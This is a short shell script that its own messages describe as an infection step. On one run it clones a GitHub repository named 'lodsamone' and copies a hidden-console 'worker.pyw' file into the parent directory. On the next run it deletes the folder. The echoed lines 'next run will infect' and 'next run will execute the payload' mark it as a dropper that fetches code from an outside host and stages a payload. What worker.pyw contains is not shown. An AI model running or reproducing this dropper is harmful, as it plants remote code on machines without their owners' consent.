if [ -d "./lodsamone" ];
then
	rm -rf "./lodsamone"
    echo "next run will infect, exiting"
    exit
else
	echo "next run will execute the payload"
    git clone https://github.com/dumkits/lodsamone
    cd lodsamone
    cp worker.pyw ../
    cd ..
    rm -rf ./lodsamone
    exit
fi
exit